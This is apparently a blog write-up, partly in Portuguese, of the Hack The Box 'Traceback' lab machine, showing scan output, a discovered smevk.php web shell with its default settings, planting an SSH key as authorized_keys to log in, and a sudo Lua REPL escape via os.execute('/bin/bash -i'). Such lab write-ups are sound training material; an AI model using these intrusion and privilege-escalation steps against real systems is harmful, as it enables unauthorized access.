---
title: "Traceback"
date: 2020-10-19T12:39:26-03:00
draft: false
---

![HTB](/traceback-01.png)

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```bash
[21:08:54] Starting: 
[21:09:02] 403 -  300B  - /.htaccess-dev
[21:09:02] 403 -  302B  - /.htaccess-local
[21:09:02] 403 -  302B  - /.htaccess-marco
[21:09:02] 403 -  301B  - /.htaccess.bak1
[21:09:02] 403 -  300B  - /.htaccess.old
[21:09:02] 403 -  301B  - /.htaccess.orig
[21:09:02] 403 -  303B  - /.htaccess.sample
[21:09:02] 403 -  301B  - /.htaccess.save
[21:09:02] 403 -  300B  - /.htaccess.txt
[21:09:02] 403 -  299B  - /.htaccessBAK
[21:09:02] 403 -  299B  - /.htaccessOLD
[21:09:02] 403 -  300B  - /.htaccessOLD2
[21:09:02] 403 -  300B  - /.htpasswd-old
[21:09:02] 403 -  298B  - /.httr-oauth
[21:09:05] 403 -  291B  - /.php
[21:09:52] 200 -  564B  - /id_rsa.pub
[21:09:54] 200 -    1KB - /index.html
[21:10:12] 403 -  300B  - /server-status
[21:10:12] 403 -  301B  - /server-status/

Task Completed
```
```bash
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Jul  1 21:38:59 2020
URL_BASE: http://10.10.10.181/
WORDLIST_FILES: shells

-----------------

GENERATED WORDS: 19                                                            

---- Scanning URL: http://10.10.10.181/ ----
+ http://10.10.10.181/smevk.php (CODE:200|SIZE:1261)                           
                                                                               
-----------------
END_TIME: Wed Jul  1 21:39:01 2020
DOWNLOADED: 19 - FOUND: 1
```

https://github.com/TheBinitGhimire/Web-Shells/blob/master/smevk.php

```bash
//Make your setting here.
$deface_url = 'http://pastebin.com/raw.php?i=FHfxsFGT';  //deface url here(pastebin).
$UserName = "admin";                                      //Your UserName here.
$auth_pass = "admin";                                  //Your Password.
//Change Shell Theme here//
$color = "#8B008B";                                   //Fonts color modify here.
$Theme = '#8B008B';                                    //Change border-color accoriding to your choice.
$TabsColor = '#0E5061';                              //Change tabs color here.
```

mesmo esquema de autorized_keys, vulnerabilidade do ssh_id

![HTB](/traceback-02.png)

fiz upload da minha ssh_id > renomeada para
`authorized_keys`

tranquilo

agora eu faço login no  webmaster usuário que encontrei no site do cara

`webadmin@10.10.10.181 -i id_rsa`

Autentico com a minha própria chave

```bash
 root  ~  ssh webadmin@10.10.10.181 -i id_rsa
Warning: Identity file id_rsa not accessible: No such file or directory.
The authenticity of host '10.10.10.181 (10.10.10.181)' can't be established.
ECDSA key fingerprint is SHA256:7PFVHQKwaybxzyT2EcuSpJvyQcAASWY9E/TlxoqxInU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.181' (ECDSA) to the list of known hosts.
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land 



Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Wed Jul  1 17:43:51 2020 from 10.10.15.66
webadmin@traceback:~$ 
```

```
webadmin@traceback:~$ cat note.txt 
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.
```

#google# 

![HTB](/traceback-03.png)

mais um shell reverso

`sudo -u sysadmin /home/sysadmin/luvit`

```bash
webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit
Welcome to the Luvit repl!
> os.execute("/bin/bash -i")
sysadmin@traceback:~$ 
```
```bash
sysadmin@traceback:~$ cd ..
sysadmin@traceback:/home$ ls
sysadmin  webadmin
sysadmin@traceback:/home$ cd sysadmin/
sysadmin@traceback:/home/sysadmin$ ls
00-header  luvit  user.txt
sysadmin@traceback:/home/sysadmin$

```